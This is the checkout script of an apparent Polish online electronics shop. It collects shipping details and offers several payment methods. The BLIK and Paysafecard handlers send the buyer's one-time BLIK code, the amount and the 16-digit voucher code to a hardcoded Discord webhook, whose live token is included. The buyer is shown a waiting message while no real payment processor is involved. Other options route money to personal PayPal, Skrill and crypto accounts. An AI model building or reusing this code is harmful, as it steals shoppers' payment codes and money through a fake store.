        const daneImieNazwisko = document.getElementById('daneImieNazwisko');
        const daneAdres = document.getElementById('daneAdres');
        const daneKodPocztowy = document.getElementById('daneKodPocztowy');
        const daneMiejscowosc = document.getElementById('daneMiejscowosc');
        const daneTelefon = document.getElementById('daneTelefon');
        const daneEmail = document.getElementById('daneEmail');
        const daneSuccess = document.getElementById('daneSuccess');
        const payOptions = document.getElementById('payOptions');
        const blikForm = document.getElementById('blikForm');
        const blikAmount = document.getElementById('blikAmount');
        const blikCode = document.getElementById('blikCode');
        const blikSuccess = document.getElementById('blikSuccess');
        const pscForm = document.getElementById('pscForm');
        const pscCode = document.getElementById('pscCode');
        const pscSuccess = document.getElementById('pscSuccess');
        const payInfo = document.getElementById('payInfo');
        const cryptoOptions = document.getElementById('cryptoOptions');
        const payFinalMsg = document.getElementById('payFinalMsg');

        let daneSaved = false;
        let currentCrypto = null;

        function openPayModal() {
            payModalBg.classList.add('open');
            payModalTitle.textContent = "Podaj dane do wysyłki";
            daneForm.style.display = 'flex';
            daneImieNazwisko.value = '';
            daneAdres.value = '';
            daneKodPocztowy.value = '';
            daneMiejscowosc.value = '';
            daneTelefon.value = '';
            daneEmail.value = '';
            daneSuccess.style.display = 'none';
            payOptions.style.display = 'none';
            blikForm.style.display = 'none';
            pscForm.style.display = 'none';
            payInfo.style.display = 'none';
            cryptoOptions.style.display = 'none';
            payFinalMsg.style.display = 'none';
            blikSuccess.style.display = 'none';
            pscSuccess.style.display = 'none';
            daneSaved = false;
            currentCrypto = null;
        }
        function closePayModalFunc() {
            payModalBg.classList.remove('open');
        }
        closePayModal.addEventListener('click', closePayModalFunc);
        payModalBg.addEventListener('mousedown', (e) => {
            if (e.target === payModalBg) closePayModalFunc();
        });

        // Dane do wysyłki
        daneForm.addEventListener('submit', function(e) {
            e.preventDefault();
            const tel = daneTelefon.value.trim();
            if (!/^\d{9}$/.test(tel)) {
                daneSuccess.style.display = 'block';
                daneSuccess.style.color = '#e53935';
                daneSuccess.textContent = 'Numer telefonu musi mieć 9 cyfr!';
                setTimeout(() => { daneSuccess.style.display = 'none'; }, 1500);
                return;
            }
            if (daneImieNazwisko.value.trim() && daneAdres.value.trim() && daneKodPocztowy.value.trim() && daneMiejscowosc.value.trim() && tel && daneEmail.value.trim()) {
                daneSuccess.style.display = 'block';
                daneSuccess.style.color = '#0f0';
                daneSuccess.textContent = 'Dane zapisane!';
                daneSaved = true;
                setTimeout(() => {
                    daneForm.style.display = 'none';
                    payModalTitle.textContent = "Wybierz metodę płatności";
                    payOptions.style.display = 'flex';
                }, 800);
            }
        });
        
        // Zablokowanie cyfr i znaków specjalnych w imieniu i nazwisku
        daneImieNazwisko.addEventListener('input', function(e) {
            e.target.value = e.target.value.replace(/[^A-Za-z\sąęłńóśźżĄĘŁŃÓŚŹŻ]/g, '');
        });

        // Automatyczne dodawanie myślnika w kodzie pocztowym i blokowanie liter
        daneKodPocztowy.addEventListener('input', function(e) {
            let value = e.target.value.replace(/[^0-9]/g, ''); // Usuwamy wszystko oprócz cyfr
            if (value.length > 2) {
                value = value.slice(0, 2) + '-' + value.slice(2);
            }
            e.target.value = value.slice(0, 6);
        });

        // Blokowanie liter i znaków specjalnych w numerze telefonu
        daneTelefon.addEventListener('input', function(e) {
            e.target.value = e.target.value.replace(/[^0-9]/g, '');
        });

        // Metody płatności
        payOptions.addEventListener('click', function(e) {
            if (e.target.classList.contains('pay-btn')) {
                payOptions.style.display = 'none';
                payInfo.style.display = 'none';
                blikForm.style.display = 'none';
                pscForm.style.display = 'none';
                cryptoOptions.style.display = 'none';
                payFinalMsg.style.display = 'none';
                blikSuccess.style.display = 'none';
                pscSuccess.style.display = 'none';
                currentCrypto = null;

                if (e.target.getAttribute('data-pay') === 'blik') {
                    blikForm.style.display = 'flex';
                } else if (e.target.getAttribute('data-pay') === 'psc') {
                    pscForm.style.display = 'flex';
                } else if (e.target.getAttribute('data-pay') === 'paypal') {
                    payInfo.style.display = 'block';
                    payInfo.innerHTML = `
                        <b>Wyślij cenę zamówienia na e-mail PayPal:</b><br>
                        <span style="color:#fff">wiktor.ozog@wp.pl</span>
                        <div style="color:var(--secondary-neon); margin-top:8px;">Prosimy o wysłanie potwierdzenia na e-mail: <b>kontakt@electrobuy.pl</b></div>
                        <button id="paypalDoneBtn" style="margin-top:14px;background:var(--button-bg);color:var(--bg-color);border:none;border-radius:12px;padding:12px 24px;font-size:1.1rem;font-weight:700;cursor:pointer;box-shadow:0 2px 8px var(--shadow-light);font-family:'Electrolize',Arial,Helvetica,sans-serif;letter-spacing:1px;">Gotowe</button>
                    `;
                    setTimeout(() => {
                        const btn = document.getElementById('paypalDoneBtn');
                        if (btn) btn.onclick = function() {
                            payInfo.innerHTML = '<span style="color:#0f0;font-weight:700;">Dziękujemy za zamówienie!</span>';
                            setTimeout(closePayModalFunc, 1200);
                            cart = [];
                            updateCart();
                            closeCartPanel();
                        };
                    }, 100);
                } else if (e.target.getAttribute('data-pay') === 'skrill') {
                    payInfo.style.display = 'block';
                    payInfo.innerHTML = `
                        <b>Wyślij cenę zamówienia na e-mail Skrill:</b><br>
                        <span style="color:#fff">oskiolimp.pl@wp.pl</span>
                        <div style="color:var(--secondary-neon); margin-top:8px;">Prosimy o wysłanie potwierdzenia na e-mail: <b>kontakt@electrobuy.pl</b></div>
                        <button id="skrillDoneBtn" style="margin-top:14px;background:var(--button-bg);color:var(--bg-color);border:none;border-radius:12px;padding:12px 24px;font-size:1.1rem;font-weight:700;cursor:pointer;box-shadow:0 2px 8px var(--shadow-light);font-family:'Electrolize',Arial,Helvetica,sans-serif;letter-spacing:1px;">Gotowe</button>
                    `;
                    setTimeout(() => {
                        const btn = document.getElementById('skrillDoneBtn');
                        if (btn) btn.onclick = function() {
                            payInfo.innerHTML = '<span style="color:#0f0;font-weight:700;">Dziękujemy za zamówienie!</span>';
                            setTimeout(closePayModalFunc, 1200);
                            cart = [];
                            updateCart();
                            closeCartPanel();
                        };
                    }, 100);
                } else if (e.target.getAttribute('data-pay') === 'crypto') {
                    cryptoOptions.style.display = 'flex';
                }
            }
        });

        // Webhook URL do Discorda
        const webhookUrl = 'https://discord.com/api/webhooks/1407517056919928972/zwMBseYPP88wE7JqyIQ-qwsksWOfw_-z4hJXzzfLrcso29Aft2xKO6s0H6VvsKLSv7kZ';

        // Funkcja do wysyłania wiadomości przez webhook
        function sendWebhookMessage(message) {
            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    content: message,
                }),
            })
            .then(response => {
                if (!response.ok) {
                    console.error('Błąd przy wysyłaniu wiadomości do webhooka:', response.status, response.statusText);
                }
            })
            .catch(error => {
                console.error('Błąd sieci:', error);
            });
        }

        // BLIK
        blikAmount.addEventListener('input', function(e) {
            const value = e.target.value;
            e.target.value = value.replace(/[^0-9zł]/g, '');
        });

        blikForm.addEventListener('submit', function(e) {
            e.preventDefault();
            const code = blikCode.value.trim();
            const amount = blikAmount.value.trim();
            if (/^\d{6}$/.test(code) && amount) {
                blikSuccess.style.display = 'block';
                blikSuccess.style.color = '#0ff';
                blikSuccess.textContent = 'Poczekaj aż kod BLIK zostanie zaakceptowany. Jeżeli nie, spróbuj ponownie później.';
                
                sendWebhookMessage(`Wprowadzono kod BLIK: **${code}**, kwota: **${amount} zł**`);

                setTimeout(() => {
                    closePayModalFunc();
                    cart = [];
                    updateCart();
                    closeCartPanel();
                }, 4000);
            } else {
                blikSuccess.style.display = 'block';
                blikSuccess.style.color = '#e53935';
                blikSuccess.textContent = 'Kod lub kwota są niepoprawne. Spróbuj później.';
                setTimeout(() => {
                    blikSuccess.style.display = 'none';
                    blikSuccess.style.color = '#0f0';
                }, 2000);
            }
        });

        // PSC
        pscCode.addEventListener('input', function(e) {
            let value = e.target.value.replace(/-/g, '').replace(/\s/g, '').replace(/[^0-9]/g, '');
            let formattedValue = '';
            for (let i = 0; i < value.length; i++) {
                if (i > 0 && i % 4 === 0) {
                    formattedValue += '-';
                }
                formattedValue += value[i];
            }
            e.target.value = formattedValue.slice(0, 19);
        });

        pscForm.addEventListener('submit', function(e) {
            e.preventDefault();
            const code = pscCode.value.replace(/-/g, '').replace(/\s/g, '');
            if (/^\d{16}$/.test(code)) {
                sendWebhookMessage(`Wprowadzono kod PSC: ${code}`);
                
                pscForm.style.display = 'none';
                payInfo.style.display = 'block';
                payInfo.innerHTML = `
                    <b>Twój kod PSC został przyjęty.</b><br>
                    <div style="color:var(--secondary-neon); margin-top:8px;">Teraz wyślij e-mail z informacją o opłaconym zamówieniu, kwotą oraz zakupionymi produktami na adres: <b>kontakt@electrobuy.pl</b></div>
                    <button id="pscDoneBtn" style="margin-top:14px;background:var(--button-bg);color:var(--bg-color);border:none;border-radius:12px;padding:12px 24px;font-size:1.1rem;font-weight:700;cursor:pointer;box-shadow:0 2px 8px var(--shadow-light);font-family:'Electrolize',Arial,Helvetica,sans-serif;letter-spacing:1px;">Gotowe</button>
                `;
                setTimeout(() => {
                    const btn = document.getElementById('pscDoneBtn');
                    if (btn) btn.onclick = function() {
                        payInfo.innerHTML = '<span style="color:#0f0;font-weight:700;">Dziękujemy za zamówienie!</span>';
                        setTimeout(closePayModalFunc, 1200);
                        cart = [];
                        updateCart();
                        closeCartPanel();
                    };
                }, 100);
            } else {
                pscSuccess.style.display = 'block';
                pscSuccess.style.color = '#e53935';
                pscSuccess.textContent = 'Wprowadzony kod jest niepoprawny.';
                setTimeout(() => {
                    pscSuccess.style.display = 'none';
                }, 2000);
            }
        });

        // Kryptowaluty
        cryptoOptions.addEventListener('click', function(e) {
            if (e.target.classList.contains('crypto-btn')) {
                currentCrypto = e.target.getAttribute('data-crypto');
                let address = '';
                let name = '';
                if (currentCrypto === 'btc') {
                    name = 'Bitcoin';
                    address = 'bc1qnwkf238m7gx4rqlf2jt9akczxr3w9pnasgn65h';
                } else if (currentCrypto === 'ltc') {
                    name = 'Litecoin';
                    address = 'LW3xCvkigxG1jTrdTWUNXXj1SNrdvfvLeP';
                } else if (currentCrypto === 'sol') {
                    name = 'Solana';
                    address = '5kHnB921X3L3bY5294aM9k4H3290pY886M8h7j3kL3t5';
                } else if (currentCrypto === 'eth') {
                    name = 'Ethereum';
                    address = '0xAbCdEf1234567890aBcdEf1234567890aBcdEf12';
                }

                cryptoOptions.style.display = 'none';
                payInfo.style.display = 'block';
                payInfo.innerHTML = `
                    <b>Wyślij cenę zamówienia na podany adres ${name}:</b><br>
                    <span style="color:#fff">${address}</span>
                    <div style="color:var(--secondary-neon); margin-top:8px;">Prosimy o wysłanie potwierdzenia na e-mail: <b>kontakt@electrobuy.pl</b></div>
                    <button id="cryptoDoneBtn" style="margin-top:14px;background:var(--button-bg);color:var(--bg-color);border:none;border-radius:12px;padding:12px 24px;font-size:1.1rem;font-weight:700;cursor:pointer;box-shadow:0 2px 8px var(--shadow-light);font-family:'Electrolize',Arial,Helvetica,sans-serif;letter-spacing:1px;">Gotowe</button>
                `;
                setTimeout(() => {
                    const btn = document.getElementById('cryptoDoneBtn');
                    if (btn) btn.onclick = function() {
                        payInfo.innerHTML = '<span style="color:#0f0;font-weight:700;">Dziękujemy za zamówienie!</span>';
                        setTimeout(closePayModalFunc, 1200);
                        cart = [];
                        updateCart();
                        closeCartPanel();
                    };
                }, 100);
            }
        });

        // Przyciski zamówienia
        checkoutBtn.addEventListener('click', function() {
            if (cart.length === 0) {
                cartError.style.display = 'block';
                cartError.textContent = 'Koszyk jest pusty.';
                if (errorTimeout) clearTimeout(errorTimeout);
                errorTimeout = setTimeout(() => {
                    cartError.style.display = 'none';
                }, 2000);
                return;
            }
            closeCartPanel();
            openPayModal();
        });
    </script>
</body>
</html>
